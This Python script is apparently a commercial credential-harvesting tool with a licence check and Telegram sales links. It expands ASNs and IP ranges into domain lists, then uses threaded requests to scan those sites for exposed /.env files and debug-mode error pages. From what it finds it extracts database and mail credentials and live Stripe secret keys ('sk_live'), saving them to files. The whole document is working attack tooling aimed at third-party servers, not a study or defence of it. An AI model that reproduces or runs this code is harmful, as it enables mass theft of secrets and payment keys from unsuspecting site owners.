import os
import re
import sys
import json
import time
import ipcalc
import urllib3
import socket
import requests
import os.path
import requests
from os import path
from netaddr import *
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class xcol:
    LGREEN = '\033[38;2;129;199;116m'
    LRED = '\033[38;2;239;83;80m'
    RESET = '\u001B[0m'
    LXC = '\033[38;2;255;152;0m'
    GREY = '\033[38;2;158;158;158m'

class asn :
   def lookup(self, asn):
      data = ""
      nc = 0
      try:
         r = requests.get(f'https://api.bgpview.io/asn/{asn}/prefixes', verify=False, allow_redirects=False)
         obj = json.dumps(json.loads(json.dumps(json.loads(r.text)["data"]))["ipv4_prefixes"])
         xa = re.sub(".*\"prefix\":\"","prefix::",obj.replace("{",""). replace ("}","").replace("[",""). replace ("]","").replace(",","\n"). replace (" ","")). replace ("\"","")
         xs = xa.splitlines() 
         for xu in xs:
            if "prefix::" in xu :
               data = data+xu+"\n"
               nc += 1
            data = data.replace("prefix::","").replace(" ","")
         with open(os.path.join('', f'ipv4.txt'), 'a', encoding='utf-8') as output:
            output.write(f'{data}')
         print(f"{xcol.LGREEN}ASN : {xcol.RESET}{asn} > {nc}")
      except :
         print(f"{xcol.LRED}ASN : {xcol.RESET}{asn} > 0")

class reverse:
   def lookup(self, cidr):
      try :
         r = requests.get(f'https://rapiddns.io/s/{cidr}?full=1&down=1#result', verify=False, allow_redirects=False)
         resp = re.sub("<th scope=\"row \">.*",">>>>>>>>>>>>>>>>>>urx",r.text).replace ("<div style=\"margin: 0 8px;\">Total: <span style=\"color: #39cfca; \">","XP>>>>>>>>>>>>>").replace ("</span></div>","").replace("<td>","").replace ("</td>","")
         urxc = resp.splitlines( )
         urls = ""
         numurls = ""
         ipurls = ""
         nm = 0
         cnt = 0
         for xc in urxc:
            nm += 1
            if ">>>>>>>>>>>>>>>>>>urx" in xc:
                urls = urls+urxc[nm]+"\n"
                cnt += 1
         with open(os.path.join('', 'urls.txt'), 'a') as output:
            output.write(f'{urls}')
         print(f"{xcol.LGREEN}[#]{xcol.RESET} {cidr} :: {cnt}")
      except Exception as e:
         print(f"{xcol.LRED}[#] {xcol.RESET}{cidr} :: ERROR")
class env :
   def scan (self, url):
      rr = ''
      proto =''
      mch = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=','sk_live', 'APP_ENV=']
      try:
         r = requests.get(f'https://{url}/.env', verify=False, timeout=10, allow_redirects=False)
         if r.status_code ==200:
            resp = r.text
            if any(key in resp for key in mch):
               rr = f'{xcol.LGREEN}[ENV]{xcol.RESET} : https://{url}'
               with open(os.path.join('ENVS', f'{url}_env.txt'), 'w') as output:
                  output.write(f'{resp}\n')
               if "sk_live" in resp:
                  file_object = open('SK_URLS.TXT', 'a')
                  file_object.write(f'URL : https://{url}\n')
                  file_object.close()
               lin = resp.splitlines( )
               for x in lin:
                  if "sk_live" in x:
                     file_object = open('SK_LIVE.TXT', 'a')
                     file_object.write(re.sub(".*sk_live","sk_live",x).replace ("\"","")+'\n')
                     file_object.close()
            else :
               rr = f'{xcol.LXC}[ENV] :{xcol.RESET} https://{url}'
         else :
            rr = f'{xcol.LXC}[ENV] :{xcol.RESET} https://{url}'
      except :
         rr = f'{xcol.LRED}[EXC] :{xcol.RESET} https://{url}'
      print(rr+'/.env')
class debug :
   def scan (self, url):
      rr = ''
      mch = ['DB_HOST', 'MAIL_HOST', 'DB_CONNECTION', 'MAIL_USERNAME','sk_live', 'APP_DEBUG']
      try:
         data = {'debug': 'true'}
         r = requests.post(f'https://{url}', data=data, allow_redirects=False, verify=False, timeout=10)
         resp = r.text
         if any(key in resp for key in mch):
            rr = f'{xcol.LGREEN}[+]{xcol.RESET} : https://{url}'
            with open(os.path.join('DEBUG', f'{url}_debug.htm'), 'w', encoding='utf-8') as output:
               output.write(f'{resp}\n')
            if "sk_live" in resp:
               with open(os.path.join('SK', f'{url}_debug.htm'), 'w', encoding='utf-8') as output:
                  output.write(f'{resp}\n')
         else :
            rr = f'{xcol.LXC}[-] :{xcol.RESET} https://{url}'
      except :
         rr = f'{xcol.LRED}[*] :{xcol.RESET} https://{url}'
      print(rr)
      
if __name__ == '__main__':
   try:
      r = requests.get(f'https://raw.githubusercontent.com/sadivailegend/verify/main/ver.ini', verify=False, allow_redirects=False)
      
      if "xenrox" in r.text:
         pass
      else:
         print(xcol.GREY+"-- EXPIRED × DM : https://t.me/afn4nx TO BUY"+xcol.RESET)
         quit()
   except Exception as e:
      print(xcol.GREY+"-- UNAUTHORIZED --"+xcol.RESET)
      quit()
   os.system('clear || cls')
   print(""" \033[38;2;158;158;158m

███████ ██   ██  ██████     ██    ██ ██████  
██      ██  ██  ██          ██    ██      ██ 
███████ █████   ██          ██    ██  █████  
     ██ ██  ██  ██           ██  ██  ██      
███████ ██   ██  ██████       ████   ███████  USER WD
                                                                                                                                              


** JOIN OUR TELEGRAM : https://t.me/ccxen_reup **
   \u001B[0m  """)
   print(f"{xcol.GREY}[1] {xcol.RESET}ASN LOOKUP")
   print(f"{xcol.GREY}[2] {xcol.RESET}IP RANGE GEN")
   print(f"{xcol.GREY}[3] {xcol.RESET}REVERSE LOOKUP")
   print(f"{xcol.GREY}[4] {xcol.RESET}GRAB ENV (HTTPS)")
   print(f"{xcol.GREY}[5] {xcol.RESET}GRAB DEBUG LOG")
   print("")
   while(True):
      try:
         THRD = int(input(xcol.GREY+"[SELECT] : "+xcol.RESET))
         if THRD == 1 :
            while(True):
               try:
                  inp = input(xcol.GREY+"[ASN LIST] : "+xcol.RESET)
                  with open(inp) as aslist:
                     lista = aslist.read().splitlines()
                  for data in lista:
                     asn().lookup(data)
                  break
               except:
                  pass
            break
         if THRD == 3 :
            while(True):
               try:
                  inp = input(xcol.GREY+"[CIDR IP LIST] : "+xcol.RESET)
                  with open(inp) as aslist:
                     lista = aslist.read().splitlines( )
                  print("*Preparing...*")
                  print("*It can take few minutes*")
                  cidr = ""
                  for data in lista:
                     try:
                        c4 = data.replace(" ","").split("/")
                        if int(c4[1])>20:
                           cidr = cidr+data+"\n"
                        else:
                           subcidr = list(IPNetwork(data).subnet(21))
                           for x3 in subcidr:
                              cidr = cidr+str(x3)+"\n"
                     except:
                        cidr = cidr+str(data)+"\n"
                     lin3 = list(dict.fromkeys(cidr.splitlines( )).keys())
                     for x4 in lin3:
                        reverse().lookup(x4)
                  break
               except Exception as e:
                  print(e)
         if THRD == 2 :
            while(True):
               try:
                  inp = input(xcol.GREY+"[CIDR IP LIST] : "+xcol.RESET)
                  with open(inp) as ipdir:
                     argFile = ipdir.read().splitlines()
                  break
               except Exception as e:
                  print(e)
            for data in argFile:
               subnet = ipcalc.Network(data)
               with open('ranged.txt', 'a') as f:
                  for x in subnet:
                     f.write(f"{x}\n")
               print(f"{xcol.LGREEN}RANGED : {xcol.RESET}{data}")
         if THRD == 4 :
            if not os.path.isdir("ENVS"):
               os.makedirs("ENVS")
            threads = []
            while(True):
               try:
                  th = int(input(xcol.GREY+"[THREAD] : "+xcol.RESET))
                  break
               except:
                  pass
            while(True):
               try:
                  inpFile = input(xcol.GREY+"[URLS PATH] : "+xcol.RESET)
                  with open(inpFile) as urlList:
                     argFile = urlList.read().splitlines()
                  break
               except:
                  pass
            with ThreadPoolExecutor(max_workers=th) as executor:
               for data in argFile:
                  threads.append(executor.submit(env().scan, data))
         if THRD == 5 :
            if not os.path.isdir("DEBUG"):
               os.makedirs("DEBUG")
            if not os.path.isdir("SK"):
               os.makedirs("SK")
            threads = []
            while(True):
               try:
                  th = int(input(xcol.GREY+"[THREAD] : "+xcol.RESET))
                  break
               except:
                  pass
            while(True):
               try:
                  inpFile = input(xcol.GREY+"[URLS PATH] : "+xcol.RESET)
                  with open(inpFile) as urlList:
                     argFile = urlList.read().splitlines()
                  break
               except:
                  pass
            with ThreadPoolExecutor(max_workers=th) as executor:
               for data in argFile:
                  threads.append(executor.submit(debug().scan, data))
         if THRD == 88779955 :
            pass
         break
      except Exception as e:
         pass
      quit()